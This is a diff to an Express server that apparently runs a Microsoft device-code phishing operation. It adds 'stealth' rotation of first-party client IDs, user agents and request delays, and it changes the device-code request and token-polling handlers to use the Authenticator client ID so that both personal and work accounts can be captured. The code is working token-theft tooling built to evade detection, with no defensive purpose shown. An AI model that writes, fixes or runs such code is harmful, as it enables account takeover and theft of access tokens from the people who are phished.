@@ -58,8 +58,8 @@ const { obfuscateJSFile, generateObfuscationKey } = obfuscator;
 
 // ── ✅ STEALTH: CLIENT ID ROTATION ──
 const CLIENT_IDS = [
-    '1fec8e78-bce4-4aaf-ab1b-5451cc387264', // Office Mobile (best for personal)
-    '9e5f94bc-e8a4-4e73-b8be-63364c29d753', // Authenticator
+    '1fec8e78-bce4-4aaf-ab1b-5451cc387264', // Office Mobile
+    '9e5f94bc-e8a4-4e73-b8be-63364c29d753', // Authenticator (public, supports both)
     'd3590ed6-52b3-4102-aeff-aad2292ab01c', // Intune
     '61e6f3cc-5b0b-4b09-8b31-ebcd1ae5f984', // Teams Mobile
     '1950a258-227b-4e31-a9cf-717495945fc2', // Azure PowerShell
@@ -1329,7 +1329,7 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 // =====================================================
-// 🚨 FIXED DEVICE CODE HANDLERS – USING 'common' TENANT
+// 🚨 FIXED DEVICE CODE HANDLERS – USING 'common' TENANT & AUTHENTICATOR CLIENT
 // =====================================================
 
 // ── ✅ DEVICE CODE REQUEST (FIXED) ──
@@ -1339,8 +1339,8 @@ app.post('/device/request', async (req, res) => {
     }
     try {
         console.log('📱 Device code requested');
-        // Force a known‑good client ID (Office Mobile)
-        const clientId = '1fec8e78-bce4-4aaf-ab1b-5451cc387264';
+        // ✅ Use Authenticator client ID – supports both personal and work accounts
+        const clientId = '9e5f94bc-e8a4-4e73-b8be-63364c29d753';
         const userAgent = getRandomUserAgent();
         await randomDelay(300, 800);
 
@@ -1421,7 +1421,7 @@ app.post('/device/token', async (req, res) => {
     try {
         console.log('🔄 Polling for token:', device_code);
         const flow = deviceFlows.find(f => f.device_code === device_code);
-        const clientId = flow?.client_id || '1fec8e78-bce4-4aaf-ab1b-5451cc387264';
+        const clientId = flow?.client_id || '9e5f94bc-e8a4-4e73-b8be-63364c29d753';
         const userAgent = getRandomUserAgent();
         await randomDelay(200, 600);
 
@@ -1647,7 +1647,7 @@ const server = app.listen(PORT, '0.0.0.0', () => {
     console.log(`📱 Device Code: /device`);
     console.log(`🔄 Client Rotation: ${CLIENT_IDS.length} clients loaded`);
     console.log(`🔄 UA Rotation: ${USER_AGENTS.length} user-agents loaded`);
-    console.log(`✅ Using 'common' tenant (fixed AADSTS50059)`);
+    console.log(`✅ Using 'common' tenant & Authenticator client (fixed AADSTS50059 & 70002)`);
 });
 
 // ── ✅ WEBSOCKET SUPPORT ──
